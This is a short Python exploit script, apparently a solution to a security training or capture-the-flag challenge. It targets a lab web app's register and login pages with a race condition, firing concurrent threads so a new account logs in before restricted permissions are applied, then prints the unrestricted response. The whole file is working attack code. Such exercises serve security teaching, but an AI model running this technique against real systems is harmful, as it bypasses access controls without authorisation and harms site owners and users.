#!/usr/bin/env python3

"""
Race conditions
Multiple insert to break the query that adds restricted permissions.
"""

import random
import string
import time
import requests
import re
import threading

URL = "http://aart.training.jinblack.it"
found = False


def register(username, password):
    url = "%s/register.php" % URL
    payload = {"username": username, "password": password}
    r = requests.post(url, data=payload)
    return r.text


def login(username, password):
    global found
    url = "%s/login.php" % URL
    payload = {"username": username, "password": password}
    r = requests.post(url, data=payload)
    if "This is a restricted account" not in r.text:
        print(r.text)
        found = True
    return r.text


def session(session, username, password):
    url = "%s/login.php" % URL
    payload = {"username": username, "password": password}
    r = requests.post(url, data=payload)
    return r.text


def random_string():
    k = random.randint(6, 10)
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


for i in range(10):
    print("Try", i)
    username = random_string()
    password = random_string()

    # s = requests.Session()

    t_register = threading.Thread(target=register, args=(
        username, password))
    t_register.start()

    t_login = threading.Thread(target=login, args=(
        username, password))
    t_login.start()

    t_login.join(timeout=1)

    if found:
        break
